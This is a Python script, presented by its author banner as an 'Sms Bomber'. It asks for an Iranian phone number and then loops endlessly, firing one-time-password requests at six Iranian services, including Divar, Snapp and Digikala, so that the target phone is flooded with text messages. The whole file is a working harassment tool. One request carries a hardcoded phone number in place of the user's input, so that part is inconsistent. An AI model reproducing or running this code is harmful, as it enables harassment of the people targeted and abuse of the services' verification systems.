import requests
import time
from colorama import Fore
from rainbowtext import text
from pyfiglet import figlet_format


red = '\033[307m' 
green = '\033[32m' 
blue = '\033[36m' 
pink = '\033[35m' 
yellow = '\033[93m' 
darkblue = '\033[34m' 
white = '\033[00m'
bold='\033[07m'

print(text(figlet_format("Arman_Virus0")))
print(f"""{green}
------------------------
{Fore.LIGHTBLUE_EX}~ {pink}Programer(Id telegram) {yellow}={green}> {darkblue}Arman_Virus0
{Fore.LIGHTBLUE_EX}~ {pink}Sourse : {yellow}={green}> {darkblue} Sms Bomber
{Fore.LIGHTBLUE_EX}~ {pink}Version Source {yellow}={green}> 1
{green}------------------------
""")


number = input(" please write number phone : +98")
timesend = int(input("  Enter the number of the time period you want to send (sleep) :  "))


#------------------------------------------
api_divar = "https://api.divar.ir/v5/auth/authenticate"

gs_divar =  {"phone": number}

#------------------------------------------

api_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"

gs_snapp =  {"cellphone": number }


#------------------------------------------

api_digi = "https://api.digikala.com/v1/user/authenticate/"

gs_digi = {"backUrl":"/","username":number,"otp_call":api_digi}


#------------------------------------------

api_ali = "https://ws.alibaba.ir/api/v3/account/mobile/otp"

url_ali = {
	"phoneNumber": number 
} 


#------------------------------------------

api_trob = "https://api.torob.com/v4/user/phone/send-pin/"


trob_params = {
    "phone_number": number
}


#------------------------------------------


api_salam = "https://auth.basalam.com/otp-request"

url_salam = {
	"client_id": 11,
	"mobile": "09228125817"
}
#------------------------------------------

while True :
    reqd = requests.post(url=api_divar,json=gs_divar)
    print(reqd)
    time.sleep(timesend)    
    reqs = requests.post(url=api_snapp,json=gs_snapp)
    print(reqs)
    time.sleep(timesend)
    reqdigi = requests.post(url=api_digi,json=gs_digi)
    print(reqdigi)
    time.sleep(timesend)
    reqali = requests.post(url=api_ali,json=url_ali)
    print(reqali)
    time.sleep(timesend)
    response = requests.get(api_trob, params=trob_params)
    print(response)
    time.sleep(timesend)
    reqsalam = requests.post(url=api_salam,json=url_salam)
    print(reqsalam)
    time.sleep(timesend)










